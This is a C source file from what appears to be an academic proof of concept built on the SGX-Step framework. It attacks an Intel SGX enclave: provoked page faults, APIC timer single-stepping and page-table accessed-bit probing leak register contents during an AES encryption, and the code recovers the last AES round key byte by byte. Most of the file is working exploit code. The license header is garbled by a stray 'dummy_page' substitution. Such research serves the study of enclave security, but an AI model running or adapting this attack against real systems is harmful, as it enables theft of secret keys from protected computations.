/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  Copyright (C) 2017 Jo Van Bulck <jo.vanbulck@cs.kuleuven.be>,
 *                     Raoul Strackx <raoul.strackx@cs.kuleuven.be>
 *  
 *  Changed 2019 by [removed for peer review]
 *  
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR dummy_page PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received dummy_page copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <sys/mman.h>
#include <signal.h>
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/config.h"

#include <string.h>
#include <pthread.h>
#include "stdio.h"
#include "stdlib.h"
#include "string.h"

// #define DEBUG_OUTPUT

#define BUFLEN 2048
#define SGX_AESGCM_MAC_SIZE 16
#define SGX_AESGCM_IV_SIZE 12

#define SSTEP   1

uint64_t dummy_page = 0;
void *ssa_frame_address = 0;
int fault_fired = 0, aep_fired = 0;
sgx_enclave_id_t global_eid = 0;

#define SSA_XSAVE_LEGACY_SIZE 512
#define SSA_XSAVE_XMM0_OFFSET 160
#define SSA_XSAVE_XMM0_SIZE 16

void dump_ssa_xmm0(void *base)
{
	info("SSA base address: %p", base);

	uint8_t bytes[SSA_XSAVE_XMM0_SIZE] = {0};
	
	edbgrd(base + SSA_XSAVE_XMM0_OFFSET, bytes, SSA_XSAVE_XMM0_SIZE);
	
	printf("XMM0 = ");
	
	for(unsigned int i = 0; i < SSA_XSAVE_XMM0_SIZE; i++)
	{
		printf("%02x", bytes[i]);
	}
	
	printf("\n");
}

void dump_ssa_frame(void *base)
{
	info("SSA base address: %p", base);

	uint8_t bytes[SSA_XSAVE_LEGACY_SIZE] = {0};
	
	edbgrd(base, bytes, SSA_XSAVE_LEGACY_SIZE);
	
	for(unsigned int i = 0; i < SSA_XSAVE_LEGACY_SIZE; i += 8)
	{
		printf("\n+%d 0x", i);
		
		// Could also use this ecall: get_addr(global_eid, bytes+j, (uint64_t)p);
		
		for(int j = 0; j < 8; j++)
		{
			printf("%0.2x", bytes[i + j]);
		}

	}
	printf("\n");

}

// Poor man's thread synchronisation. Flag 1 will be set to wakeup thread B, and flag 2 will signal to the
// fault handler (within thread dummy_page's context) to resume
volatile int flag1 = 0;
volatile int flag2 = 0;

// Handle the page fault in thread dummy_page
void fault_handler(int signal)
{
	// Restore memory permissions, this will continue the thread when the fault handler returns
    if (flag2 == 1) return;
	
	#ifdef DEBUG_OUTPUT
	info("Caught fault %d! Restoring access rights.", signal);
	#endif
	
	ASSERT(!mprotect((void*)dummy_page, 4096, PROT_READ | PROT_WRITE));
	//print_pte_adrs(dummy_page);

	fault_fired++;
	
	// Store the right OSSA address. This code should really go into libsgxstep
	static uint64_t ossa = 0x0;

    void *tcs_addr = sgx_get_tcs();
    edbgrd(tcs_addr + SGX_TCS_OSSA_OFFSET, &ossa, 8);
	
	#ifdef DEBUG_OUTPUT
	info("TCS = %p, OSSA = %x", tcs_addr, ossa);
	#endif
	
	ssa_frame_address = get_enclave_base() + ossa;
	
	#ifdef DEBUG_OUTPUT
	info("SSA frame at %p", ssa_frame_address);
	#endif
	
	// Release flag 1 and allow Thread B to continue
	flag1 = 0;

	// Keep Thread dummy_page waiting, unti Thread B arrived
	flag2++;
	while(flag2 == 1) ; 

}
 
idt_t sstep_idt = {0};
int irq_cnt = 0, do_irq = 0;
char *probe_adrs = NULL;
uint64_t *pte_encl=NULL, *pmd_encl=NULL, *pte_probe = NULL;
int strlen_nb_access = 0;

void aep_cb_func(void)
{
    #ifdef DEBUG_OUTPUT
    uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
    info("^^ enclave RIP=%#llx; ACCESSED=%d", erip, ACCESSED(*pte_encl));
    #endif
    irq_cnt++;

    if (pte_probe)
    {
        if (ACCESSED(*pte_probe))
        {
            #ifdef DEBUG_OUTPUT
            info("accessed!");
            #endif
            strlen_nb_access++;
        }
        *pte_probe = MARK_NOT_ACCESSED( *pte_probe );
    }

    if (do_irq && (irq_cnt > 500000))
    {
        info("excessive interrupt rate detected (try adjusting timer interval " \
             "to avoid getting stuck in zero-stepping); aborting...");
	    do_irq = 0;
    }

    /*
     * NOTE: We explicitly clear the "accessed" bit of the _unprotected_ PTE
     * referencing the enclave code page about to be executed, so as to be able
     * to filter out "zero-step" results that won't set the accessed bit.
     */
    *pte_encl = MARK_EXECUTABLE( *pte_encl );
    *pte_encl = MARK_NOT_ACCESSED( *pte_encl );

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     * 
     */
    if (do_irq)
    {
        *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
        apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
    }
}

void setup_sstep(void)
{
    void *p = NULL;

    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    register_aep_cb(aep_cb_func);

    /* NOTE: we ensure above to always run the sstep code on the same CPU so we
     * can setup global APIC/IDT mappings once */
    if (!sstep_idt.base)
    {
        map_idt(&sstep_idt);
        install_user_irq_handler(&sstep_idt, NULL, IRQ_VECTOR);

        SGX_ASSERT( getEncryptStringAdrs(global_eid, &p) );
        pte_encl = remap_page_table_level(p, PTE);
        pmd_encl = remap_page_table_level(p, PMD);
    }

    probe_adrs = (char*)ssa_frame_address + SSA_XSAVE_XMM0_OFFSET;
    pte_probe = remap_page_table_level(probe_adrs, PTE);

    apic_timer_oneshot(IRQ_VECTOR);
    asm("int %0\n\t" ::"i"(IRQ_VECTOR):);

    *pte_encl = MARK_NON_EXECUTABLE( *pte_encl );
    do_irq=1;
    irq_cnt=0;
    strlen_nb_access = 0;
}

int runs = 0;

void teardown_sstep(void)
{
    apic_timer_deadline();
    free_map(pte_probe);
    probe_adrs = NULL;
    pte_probe = NULL;
    do_irq=0;

#if 0
    if (runs++ == 100)
    exit(1);
#endif
}

// Thread B to dump the SSA frame and/or call the oracle
void *ecall_oracle(void *input)
{
	// Use the strlen oracle to simulate the single stepping
    sgx_enclave_id_t eid = *((sgx_enclave_id_t*)input);
	uint64_t length = 0;
    sgx_status_t retval;

#if SSTEP
    setup_sstep();    
    retval = encryptString(global_eid, probe_adrs, NULL);
    length = strlen_nb_access - 2;
    teardown_sstep();

    #ifdef DEBUG_OUTPUT
	    SGX_ASSERT( strlenOracle(global_eid, &length, (uint64_t) probe_adrs) );
        info("ground truth is %d/%d", length, strlen_nb_access);
    #endif
#else
	SGX_ASSERT( (retval = strlenOracle(global_eid, &length, (uint64_t)ssa_frame_address + SSA_XSAVE_XMM0_OFFSET)) );
#endif
	
	#ifdef DEBUG_OUTPUT
	
	info("strlenOracle() = %d, success/fail = %d", length, retval);
	
	// Dump the SSA frame xmm0
	dump_ssa_xmm0(ssa_frame_address);
	
	#endif
	
	
	// Release flag2 to allow thread dummy_page to continue
	flag2 = 0;
	
	// Return the oracle value to handle that in the main code
	return (void*)length;
}

char plaintext[17] = {0};
uint8_t ciphertext[16] = {0};

void *ecall_encrypt(void *input)
{
    sgx_enclave_id_t eid = *((sgx_enclave_id_t*)input);
	
	// Do the ecall, make sure plaintext is properly terminated
	plaintext[16] = 0;
	sgx_status_t ret = encryptString(eid, plaintext, ciphertext);

	SGX_ASSERT(ret);
	
	#ifdef DEBUG_OUTPUT
	// Build and return result string
	char* res = (char *)malloc(sizeof(char) * 500);
	
	ASSERT(res != 0);
	
	sprintf(res,"Ecall ret status : %x\n",ret);
	sprintf(res,"%sPlain text : ",res);
    
	for(unsigned int i = 0; i < 16; i++)
	{
         sprintf(res,"%s0x%x ", res, plaintext[i]); 
	} 
	
	sprintf(res,"%s\nCipher text : ",res);
	
	for(unsigned int i = 0; i < 16; i++)
	{
        sprintf(res,"%s0x%x ", res, ciphertext[i]);
	}
    
	return (void*)res;
	#endif
	
	return 0;
}

// We actually only use sbox[0], but leave the full S-Box here in any case
static const uint8_t sbox[256] = {
	0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
	0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
	0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
	0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
	0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
	0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
	0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
	0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
	0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
	0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
	0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
	0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
	0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
	0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
	0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
	0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 
};
  
static uint8_t get_pos_after_shiftrows(const uint8_t pos)
{
	uint8_t shift[16] = {
		0, 13, 10, 7, 4, 1, 14, 11, 8, 5, 2, 15, 12, 9, 6, 3,
	};
	
	return shift[pos & 0xf];
}

static uint8_t recover_rk10_from_zero(const uint8_t ct[16], const uint8_t pos)
{
	// Get respective CT byte
	return ct[get_pos_after_shiftrows(pos)] ^ sbox[0];
	
}

static uint64_t run_threads_once(sgx_enclave_id_t eid)
{
	pthread_t t1;
	pthread_t t2;
	
	// Reset status variables / locks
	fault_fired = 0;
	aep_fired = 0;
	flag1 = 0;
	flag2 = 0;
	
	sgx_enclave_id_t *arg1 = malloc(sizeof(*arg1));
	*arg1 = eid;
	sgx_enclave_id_t *arg2 = malloc(sizeof(*arg2));
    *arg2 = eid;

	void *result_string = 0;
	uint64_t oracle_strlen = 0;
	
	#ifdef DEBUG_OUTPUT
	info("Starting encryption thread (thread dummy_page)");
	#endif
	
	// Create thread A
	pthread_create(&t1, NULL, ecall_encrypt, arg1);

	// Only one ecall will allowed from one thread.
	// Thread A will pass, thread B will wait.
	flag1++;
	while(flag1 == 1);

	// Create thread B
	pthread_create(&t2, NULL, ecall_oracle, arg2);
	
	// Wait for both threads to finish
	pthread_join(t1, &result_string);
	pthread_join(t2, (void*)(&oracle_strlen));

	#ifdef DEBUG_OUTPUT
	info("Encryption complete, oracle = %d", oracle_strlen);
	info("%s",(char *)result_string);
	
	// Thread A malloc()ed this, we clean it up here
	free(result_string);
	
	info("ff = %d, af = %d", fault_fired, aep_fired);
	#endif
	
	ASSERT(fault_fired);
	
	// Arg pointers
	free(arg1);
	free(arg2);
	
	return oracle_strlen;
}

int main(int argc, char **argv)
{
	sgx_launch_token_t token = {0};
	int retval = 0, updated = 0;
    sgx_enclave_id_t eid = 0;
	
	uint8_t rk_found[16] = {0};
	uint8_t rk_reconstructed[16] = {0};
	uint8_t rk_found_cnt = 0;
	
	srand(0);

   	info("Creating enclave...");
	SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", /*debug=*/1,
                                  &token, &updated, &eid, NULL));
	global_eid = eid;

	// Setup AEP handler
	// register_aep_cb(aep_cb_func);
	
	// Install pf handler
	ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);

	// Get the address of the dummy page from the enclave
	getArrayAddress(eid, &dummy_page);

	uint8_t run = 1;
	
	for(unsigned int pt = 0; pt < 1024 && run; pt++)
	{
		// Random PT
		for(unsigned int i = 0; i < 16; i++)
		{
			plaintext[i] = rand();
		}
		
		/* mprotect to provoke page faults during enclaved execution */
		// info("%d: Revoking dummy page access rights...", pt);
		ASSERT(!mprotect((void*)dummy_page, 4096, PROT_NONE));
		
		// Run both threads
		const uint64_t leakage = run_threads_once(eid);
		
		if(leakage < 16)
		{
			const uint8_t key_byte = get_pos_after_shiftrows(leakage);
			const uint8_t rec_byte = recover_rk10_from_zero(ciphertext, leakage);
			
			printf("Useful leak at %d for key byte %d = %02x", pt, key_byte, rec_byte); 
			
			if(rk_found[key_byte])
			{
				printf("-> already known\n");
			}
			else
			{
				printf("-> NEW!\n");
				rk_reconstructed[key_byte] = rec_byte;
				rk_found[key_byte] = 1;
				rk_found_cnt++;
				
				if(rk_found_cnt == 16)
				{
					printf("All round key bytes found after %d plaintexts\n", pt + 1);
					run = 0;
				}
			}
			
			printf("Current rk10 = ");
			for(unsigned int b = 0; b < 16; b++)
			{
				printf("%02x ", rk_reconstructed[b]);
			}
			printf("\n");
		}
		else
		{
			printf("Useless leakage %d for %d\n", leakage, pt);
		}
	}
	
	SGX_ASSERT(sgx_destroy_enclave(eid));

	return 0;
}
